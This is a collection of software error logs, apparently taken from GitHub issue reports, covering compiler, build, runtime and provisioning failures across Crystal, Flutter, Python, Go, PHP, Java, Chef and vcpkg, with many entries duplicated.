*Crystal::Command#run_command<Crystal::Command>:Nil +145\r\n[4337887094] *Crystal::Command#run<Crystal::Command>:(Array(Crystal::ImplementationTrace) | Array(Crystal::Init::View+:Class) | Array(String) | Bool | Crystal::Compiler::Result | Hash(String, String) | IO::FileDescriptor+ | Nil) +12278\r\n[4330868522] __crystal_main +24378\r\n[4337837710] main +46\r\n\r\nError: you've found a bug in the Crystal compiler. Please open an issue, including source code that username_0 allow us to reproduce the bug: https://github.com/crystal-lang/crystal/issues"
    },
    {
        "logs": "E/flutter ( 2658): [ERROR:topaz/lib/tonic/logging/dart_error.cc(16)] Unhandled exception:\r\nE/flutter ( 2658): type '_InternalLinkedHashMap<String, dynamic>' is not a subtype of type 'Iterable<dynamic>' in type cast where\r\nE/flutter ( 2658):   _InternalLinkedHashMap is from dart:collection\r\nE/flutter ( 2658):   String is from dart:core\r\nE/flutter ( 2658):   Iterable is from dart:core"
    },
    {
        "logs": "E/flutter ( 2658): [ERROR:topaz/lib/tonic/logging/dart_error.cc(16)] Unhandled exception:\r\nE/flutter ( 2658): type '_InternalLinkedHashMap<String, dynamic>' is not a subtype of type 'Iterable<dynamic>' in type cast where\r\nE/flutter ( 2658):   _InternalLinkedHashMap is from dart:collection\r\nE/flutter ( 2658):   String is from dart:core\r\nE/flutter ( 2658):   Iterable is from dart:core"
    },
    {
        "logs": "Traceback (most recent call last):\r\n  File \"segrnn-argid.py\", line 98, in <module>\r\n    wvs = get_wvec_map()\r\n  File \"/Users/username_0/code/huggingface/open-sesame/src/dataio.py\", line 276, in get_wvec_map\r\n    raise Exception(\"word vector file not found!\", FILTERED_WVECS_FILE)\r\nException: ('word vector file not found!', '../data/glove.6B.100d.framenet.txt')"
    },
    {
        "logs": "[dev epoch=0 after=2001] lprec = 0.40382 lrec = 0.14518 lf1 = 0.21358 -- savinglibc++abi.dylib: terminating with uncaught exception of type std::runtime_error: Could not write model to tmp/1.7model.sra-1527520332.05"
    },
    {
        "logs": "[dynet] random seed: 1594657864\r\n[dynet] allocating memory: 512MB\r\n[dynet] memory allocation done.\r\n\r\nCOMMAND: segrnn-argid.py\r\n\r\nPARSER SETTINGS\r\n\r\nPARSING MODE:   \ttrain\r\nUSING EXEMPLAR? \tFalse\r\nUSING SPAN CLIP?\tTrue\r\nLOSS TYPE:      \tsoftmaxm\r\nCOST TYPE:      \trecall\r\nR-O COST VALUE: \t2\r\nUSING DROPOUT?  \tTrue\r\nUSING WORDVECS? \tTrue\r\nUSING HIERARCHY?\tFalse\r\nUSING D-SYNTAX? \tFalse\r\nUSING C-SYNTAX? \tFalse\r\nUSING PTB-CLOSS?\tFalse\r\nMODEL WILL BE SAVED TO\ttmp/1.7model.sra-1527520332.05\r\n\r\nreading ../data/neural/fn1.7/fn1.7.fulltext.train.syntaxnet.conll...\r\n# examples in ../data/neural/fn1.7/fn1.7.fulltext.train.syntaxnet.conll : 19391 in 3413 sents\r\n# examples with missing arguments : 526\r\n\r\nreading the frame-element - frame map from ../data/fndata-1.7/frame/...\r\n# max FEs for frame: 32 in Frame(Traversing)\r\n\r\nreading the word vectors file from ../data/glove.6B.100d.txt...\r\nusing pretrained embeddings of dimension 100\r\n# words in vocab:       400575\r\n# POS tags:             45\r\n# lexical units:        9441\r\n# LU POS tags:          14\r\n# frames:               1223\r\n# FEs:                  1287\r\n# dependency relations: 1\r\n# constituency labels:  1\r\n\r\nclipping spans longer than 20...\r\nlongest span size: 102\r\nlongest FE span size: 89\r\n# train examples before filter: 19391\r\n# train examples after filter: 19391\r\n\r\nreading ../data/neural/fn1.7/fn1.7.dev.syntaxnet.conll...\r\n[Truncated]\n[lr=0.0005 clips=98 updates=100] 900 loss = 16.837128 [took 49.753 s]\r\n[lr=0.0005 clips=100 updates=100] 1000 loss = 17.795842 [took 51.235 s]\r\n[dev epoch=0 after=1001] wprec = 0.00000 wrec = 0.00000 wf1 = 0.00000\r\n[dev epoch=0 after=1001] uprec = 0.00000 urec = 0.00000 uf1 = 0.00000\r\n[dev epoch=0 after=1001] lprec = 0.00000 lrec = 0.00000 lf1 = 0.00000 [took 621.073 s]\r\n[lr=0.0005 clips=100 updates=100] 1100 loss = 16.862659 [took 50.687 s]\r\n[lr=0.0005 clips=100 updates=100] 1200 loss = 14.759756 [took 40.827 s]\r\n[lr=0.0005 clips=100 updates=100] 1300 loss = 14.575772 [took 39.446 s]\r\n[lr=0.0005 clips=100 updates=100] 1400 loss = 14.491017 [took 42.966 s]\r\n[lr=0.0005 clips=100 updates=100] 1500 loss = 15.175744 [took 55.345 s]\r\n[lr=0.0005 clips=100 updates=100] 1600 loss = 14.648142 [took 42.464 s]\r\n[lr=0.0005 clips=100 updates=100] 1700 loss = 13.749653 [took 50.359 s]\r\n[lr=0.0005 clips=100 updates=100] 1800 loss = 13.874129 [took 46.874 s]\r\n[lr=0.0005 clips=100 updates=100] 1900 loss = 14.471691 [took 42.907 s]\r\n[lr=0.0005 clips=100 updates=100] 2000 loss = 13.668519 [took 49.962 s]\r\n[dev epoch=0 after=2001] wprec = 0.41848 wrec = 0.06883 wf1 = 0.11822\r\n[dev epoch=0 after=2001] uprec = 0.55100 urec = 0.18472 uf1 = 0.27668\r\n[dev epoch=0 after=2001] lprec = 0.40382 lrec = 0.14518 lf1 = 0.21358 -- savinglibc++abi.dylib: terminating with uncaught exception of type std::runtime_error: Could not write model to tmp/1.7model.sra-1527520332.05\r\n[1]    54727 abort      python segrnn-argid.py"
    },
    {
        "logs": "...\r\n[2173/7974] Failed to download http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: Get http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: dial tcp [2a02:2e0:3fe:1001:7777:772e:2:85]:80: i/o timeout                                                                                              \r\n[2174/7974] Downloaded http://www.fky.org/restaurierung/Klabunde/Lacke.htm                                                                          \r\n[2175/7974] Downloaded http://yakamo.org/?p=1506                                                                                                    \r\n[2176/7974] Downloaded http://www.kaspersky.com/antivirus-removal-tool?form=1\r\npanic: sync: WaitGroup is reused before previous Wait has returned\r\n\r\ngoroutine 1237523 [running]:\r\nsync.(*WaitGroup).Wait(0xc00586f578)                                                                                                                 \r\n        /nix/store/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee-go-1.12.9/share/go/src/sync/waitgroup.go:132 +0xae                                                                   \r\ngithub.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver.func1(0xc00586f560)                                                                     \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:39 +0x3e                                                                        \r\ncreated by github.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver                                                                              \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:37 +0x54                                                                        "
    },
    {
        "logs": "...\r\n[2173/7974] Failed to download http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: Get http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: dial tcp [2a02:2e0:3fe:1001:7777:772e:2:85]:80: i/o timeout                                                                                              \r\n[2174/7974] Downloaded http://www.fky.org/restaurierung/Klabunde/Lacke.htm                                                                          \r\n[2175/7974] Downloaded http://yakamo.org/?p=1506                                                                                                    \r\n[2176/7974] Downloaded http://www.kaspersky.com/antivirus-removal-tool?form=1\r\npanic: sync: WaitGroup is reused before previous Wait has returned\r\n\r\ngoroutine 1237523 [running]:\r\nsync.(*WaitGroup).Wait(0xc00586f578)                                                                                                                 \r\n        /nix/store/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee-go-1.12.9/share/go/src/sync/waitgroup.go:132 +0xae                                                                   \r\ngithub.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver.func1(0xc00586f560)                                                                     \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:39 +0x3e                                                                        \r\ncreated by github.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver                                                                              \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:37 +0x54                                                                        "
    },
    {
        "logs": " ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/course/CourseMaterialsView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  25     Function app\\views\\course\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  25     Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  138    Function add_files not found.\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/grading/ElectronicGraderView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  842    Function app\\views\\grading\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  842    Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  874    Function add_files not found.\r\n  875    Function add_files not found.\r\n  876    Function add_files not found.\r\n  877    Function add_files not found.\r\n ------ -------------------------------------------------------------------------------"
    },
    {
        "logs": " ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/course/CourseMaterialsView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  25     Function app\\views\\course\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  25     Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  138    Function add_files not found.\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/grading/ElectronicGraderView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  842    Function app\\views\\grading\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  842    Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  874    Function add_files not found.\r\n  875    Function add_files not found.\r\n  876    Function add_files not found.\r\n  877    Function add_files not found.\r\n ------ -------------------------------------------------------------------------------"
    },
    {
        "logs": "**Expected behavior**\r\n1. The test should pass without warning\r\n2. A new recording entry should be generated.\r\n\r\n**Environment summary**\r\nInstall Method (e.g. pip, interactive script, apt-get, Docker, MSI, edge build) / CLI version ("
    },
    {
        "logs": " log\r\nerror: Dynamically imported module evaluation is still pending but there are no pending ops. This situation is often caused by unresolved promise.\r\nerror Command failed with exit code 1."
    },
    {
        "logs": " log\r\nerror: Dynamically imported module evaluation is still pending but there are no pending ops. This situation is often caused by unresolved promise.\r\nerror Command failed with exit code 1."
    },
    {
        "logs": "  In src/file.cr:822:18\r\n  \r\n   822 | io = PReader.new(self, offset, bytesize)\r\n                      ^--\r\n  Error: no overload matches 'File::PReader.new' with types File, Int32, Int32"
    },
    {
        "logs": "  In src/file.cr:822:18\r\n  \r\n   822 | io = PReader.new(self, offset, bytesize)\r\n                      ^--\r\n  Error: no overload matches 'File::PReader.new' with types File, Int32, Int32"
    },
    {
        "logs": "node_modules/@octokit/graphql-schema/index.d.ts:1:30 - error TS2307: Cannot find module 'graphql' or its corresponding type declarations.\r\n\r\n1 import { GraphQLError } from \"graphql\";"
    },
    {
        "logs": "ERROR: Executing: ClusterAnalysis \"C:\\Data\\Defense Solutions\\solutions-geoproces\r\nsing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\" \"500\r\n Unknown\" \"C:\\Data\\Defense Solutions\\solutions-geoprocessing-toolbox\\utils\\test\\\r\npatterns_tests\\data\\scratch.gdb\\outputClusters\"\r\nStart Time: Tue Dec 22 13:11:43 2015\r\nExecuting (Copy Features): CopyFeatures \"C:\\Data\\Defense Solutions\\solutions-geo\r\nprocessing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\r\n\" C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cluster # 0 0 0\r\nStart Time: Tue Dec 22 13:11:46 2015\r\nERROR 000210: Cannot create output C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cl\r\nuster\r\nFailed to execute (Copy Features).\r\nFailed at Tue Dec 22 13:11:48 2015 (Elapsed Time: 1.76 seconds)"
    },
    {
        "logs": "ERROR: Executing: ClusterAnalysis \"C:\\Data\\Defense Solutions\\solutions-geoproces\r\nsing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\" \"500\r\n Unknown\" \"C:\\Data\\Defense Solutions\\solutions-geoprocessing-toolbox\\utils\\test\\\r\npatterns_tests\\data\\scratch.gdb\\outputClusters\"\r\nStart Time: Tue Dec 22 13:11:43 2015\r\nExecuting (Copy Features): CopyFeatures \"C:\\Data\\Defense Solutions\\solutions-geo\r\nprocessing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\r\n\" C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cluster # 0 0 0\r\nStart Time: Tue Dec 22 13:11:46 2015\r\nERROR 000210: Cannot create output C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cl\r\nuster\r\nFailed to execute (Copy Features).\r\nFailed at Tue Dec 22 13:11:48 2015 (Elapsed Time: 1.76 seconds)"
    },
    {
        "logs": "error: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.peekKey()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.pollElement()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.peekElement()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.clear()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.isEmpty()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.insert(Number, Integer)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.ensureCapacity(int)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.getSize()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.update(Number, Integer)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: OTPIntDoubleBinHeap cannot be resolved to a type"
    },
    {
        "logs": "error: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:20: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:21: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:22: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:35: XMLStreamReader cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:35: XMLStreamException cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:47: XMLStreamReader cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:47: XMLStreamException cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:50: XMLStreamConstants cannot be resolved to a variable\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:52: XMLStreamConstants cannot be resolved to a variable"
    },
    {
        "logs": "error: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:148: The method poll_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:175: The method insert_(double, int) is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:183: The method update_(double, int) is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:193: The method peek_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:197: The method poll_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:241: The method getCapacity() is undefined for the type IntDoubleBinHeap"
    },
    {
        "logs": "         * iptables_rule[firewall_certificate] action enable\r\n           * template[/etc/iptables.d/firewall_certificate] action create\r\n             - create new file /etc/iptables.d/firewall_certificate\r\n             - update content in file /etc/iptables.d/firewall_certificate from none to 58bfcf\r\n             --- /etc/iptables.d/firewall_certificate\t2018-12-19 13:16:09.613963052 +0000\r\n             +++ /etc/iptables.d/.chef-firewall_certificate20181219-16012-5vaw84\t2018-12-19 13:16:09.613963052 +0000\r\n             @@ -1 +1,2 @@\r\n             +-A OS_FIREWALL_ALLOW -m state --state NEW,ESTABLISHED -m comment --comment \"OpenShift HTTPD\" -m tcp -p tcp --dport 9999 -j ACCEPT\r\n             - change mode from '' to '0644'\r\n             - restore selinux security context\r\n         \r\n         * cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] action install\r\n           * yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] action install\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             ================================================================================\r\n             Error executing action "
    },
    {
        "logs": " on resource 'yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs]'\r\n             ================================================================================\r\n             \r\n             Chef::Exceptions::Package\r\n             -------------------------\r\n             No candidate version available for tuned-profiles-origin-node\r\n             \r\n             Resource Declaration:\r\n             ---------------------\r\n             # In /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb\r\n             \r\n       61:     yum_package pkg_master_to_install.reject { |x| x == \"tuned-profiles-#{node['cookbook-openshift3']['openshift_service_type']}-node\" && node['cookbook-openshift3']['control_upgrade_version'].to_i >= 39 } do\r\n       62:       action :install\r\n       63:       version Array.new(pkg_master_to_install.size, version) unless version.nil?\r\n       64:       options new_resource.options.nil? ? node['cookbook-openshift3']['openshift_yum_options'] : new_resource.options\r\n       65:       notifies :run, 'execute[daemon-reload]', :immediately\r\n       66:       not_if { node['cookbook-openshift3']['deploy_containerized'] || (is_certificate_server && node['fqdn'] != first_master['fqdn']) }\r\n       67:       retries 3\r\n       68:     end\r\n       69: \r\n             \r\n             Compiled Resource:\r\n             ------------------\r\n             # Declared in /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb:61:in "
    },
    {
        "logs": "         * iptables_rule[firewall_certificate] action enable\r\n           * template[/etc/iptables.d/firewall_certificate] action create\r\n             - create new file /etc/iptables.d/firewall_certificate\r\n             - update content in file /etc/iptables.d/firewall_certificate from none to 58bfcf\r\n             --- /etc/iptables.d/firewall_certificate\t2018-12-19 13:16:09.613963052 +0000\r\n             +++ /etc/iptables.d/.chef-firewall_certificate20181219-16012-5vaw84\t2018-12-19 13:16:09.613963052 +0000\r\n             @@ -1 +1,2 @@\r\n             +-A OS_FIREWALL_ALLOW -m state --state NEW,ESTABLISHED -m comment --comment \"OpenShift HTTPD\" -m tcp -p tcp --dport 9999 -j ACCEPT\r\n             - change mode from '' to '0644'\r\n             - restore selinux security context\r\n         \r\n         * cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] action install\r\n           * yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] action install\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             ================================================================================\r\n             Error executing action `install` on resource 'yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs]'\r\n             ================================================================================\r\n             \r\n             Chef::Exceptions::Package\r\n             -------------------------\r\n             No candidate version available for tuned-profiles-origin-node\r\n             \r\n             Resource Declaration:\r\n             ---------------------\r\n             # In /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb\r\n             \r\n       61:     yum_package pkg_master_to_install.reject { |x| x == \"tuned-profiles-#{node['cookbook-openshift3']['openshift_service_type']}-node\" && node['cookbook-openshift3']['control_upgrade_version'].to_i >= 39 } do\r\n       62:       action :install\r\n       63:       version Array.new(pkg_master_to_install.size, version) unless version.nil?\r\n       64:       options new_resource.options.nil? ? node['cookbook-openshift3']['openshift_yum_options'] : new_resource.options\r\n       65:       notifies :run, 'execute[daemon-reload]', :immediately\r\n       66:       not_if { node['cookbook-openshift3']['deploy_containerized'] || (is_certificate_server && node['fqdn'] != first_master['fqdn']) }\r\n       67:       retries 3\r\n       68:     end\r\n       69: \r\n             \r\n             Compiled Resource:\r\n             ------------------\r\n             # Declared in /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb:61:in `block in class_from_file'\r\n             \r\n             yum_package(\"origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs\") do\r\n        package_name [\"origin-master\", \"origin-clients\", \"origin\", \"origin-node\", \"tuned-profiles-origin-node\", \"origin-sdn-ovs\"]\r\n        action [:install]\r\n        default_guard_interpreter :default\r\n        declared_type :yum_package\r\n        cookbook_name \"cookbook-openshift3\"\r\n        version [\"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\"]\r\n        retries 3\r\n        options []\r\n        not_if { #code block }\r\n             end\r\n             \r\n             System Info:\r\n             ------------\r\n             chef_version=14.8.12\r\n             platform=centos\r\n             platform_version=7.4.1708\r\n             ruby=ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux]\r\n             program_name=/opt/chef/bin/chef-client\r\n             executable=/opt/chef/bin/chef-client\r\n             \r\n           \r\n           ================================================================================\r\n           Error executing action `install` on resource 'cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server]'\r\n           ================================================================================\r\n           \r\n           Chef::Exceptions::Package\r\n           -------------------------\r\n           yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] (/tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb line 61) had an error: Chef::Exceptions::Package: No candidate version available for tuned-profiles-origin-node\r\n[Truncated]\n           chef_version=14.8.12\r\n           platform=centos\r\n           platform_version=7.4.1708\r\n           ruby=ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux]\r\n           program_name=/opt/chef/bin/chef-client\r\n           executable=/opt/chef/bin/chef-client\r\n           \r\n       Recipe: iptables::default\r\n         * execute[rebuild-iptables] action run\r\n           - execute /usr/sbin/rebuild-iptables\r\n       \r\n       Running handlers:\r\n       [2018-12-19T13:16:16+00:00] ERROR: Running exception handlers\r\n       Running handlers complete\r\n       [2018-12-19T13:16:16+00:00] ERROR: Exception handlers complete\r\n       Chef Client failed. 35 resources updated in 01 minutes 58 seconds\r\n       [2018-12-19T13:16:16+00:00] FATAL: Stacktrace dumped to /tmp/vagrant-cache/chef/chef-stacktrace.out\r\n       [2018-12-19T13:16:16+00:00] FATAL: Please provide the contents of the stacktrace.out file if you file a bug report\r\n       [2018-12-19T13:16:16+00:00] FATAL: Chef::Exceptions::Package: cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] (cookbook-openshift3::certificate_server line 20) had an error: Chef::Exceptions::Package: yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] (/tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb line 61) had an error: Chef::Exceptions::Package: No candidate version available for tuned-profiles-origin-node"
    },
    {
        "logs": "$ ./vcpkg/vcpkg install breakpad\r\nThe following packages will be built and installed:\r\n    breakpad[core]:x64-osx\r\n  * libdisasm[core]:x64-osx\r\nAdditional packages (*) will be modified to complete this operation.\r\nStarting package 1/2: libdisasm:x64-osx\r\nBuilding package libdisasm[core]:x64-osx...\r\n-- Downloading https://sourceforge.net/projects/bastard/files/libdisasm/0.23/libdisasm-0.23.tar.gz...\r\n-- Extracting source /Users/buccim2/Development/Squally/src/vcpkg/downloads/libdisasm-0.23.tar.gz\r\n-- Applying patch /Users/buccim2/Development/Squally/src/vcpkg/ports/libdisasm/sizeofvoid.patch\r\n-- Configuring x64-osx-dbg\r\n-- Configuring x64-osx-rel\r\n-- Building x64-osx-dbg\r\n-- Building x64-osx-rel\r\n-- Installing: /Users/buccim2/Development/Squally/src/vcpkg/packages/libdisasm_x64-osx/share/libdisasm/copyright\r\n-- Performing post-build validation\r\n-- Performing post-build validation done\r\nBuilding package libdisasm[core]:x64-osx... done\r\nInstalling package libdisasm[core]:x64-osx...\r\nInstalling package libdisasm[core]:x64-osx... done\r\nElapsed time for package libdisasm:x64-osx: 4.215 s\r\nStarting package 2/2: breakpad:x64-osx\r\nBuilding package breakpad[core]:x64-osx...\r\n-- Downloading https://github.com/google/breakpad/archive/54fa71efbe50fb2b58096d871575b59e12edba6d.tar.gz...\r\n-- Extracting source /Users/buccim2/Development/Squally/src/vcpkg/downloads/google-breakpad-54fa71efbe50fb2b58096d871575b59e12edba6d.tar.gz\r\n-- Using source at /Users/buccim2/Development/Squally/src/vcpkg/buildtrees/breakpad/src/9e12edba6d-12269dd01c\r\n-- Configuring x64-osx-dbg\r\n-- Configuring x64-osx-rel\r\n-- Building x64-osx-dbg\r\n-- Building x64-osx-rel\r\n-- Installing: /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/share/breakpad/copyright\r\n-- Performing post-build validation\r\nThere should be no empty directories in /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx\r\nThe following empty directories were found:\r\n\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/Breakpad.xcodeproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/gcov\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/handler/minidump_test.xcodeproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/da.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/de.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/English.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/es.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/fr.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/it.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/ja.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/nl.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/no.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/sl.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/sv.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/tr.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/testapp/English.lproj\r\n\r\nIf a directory should be 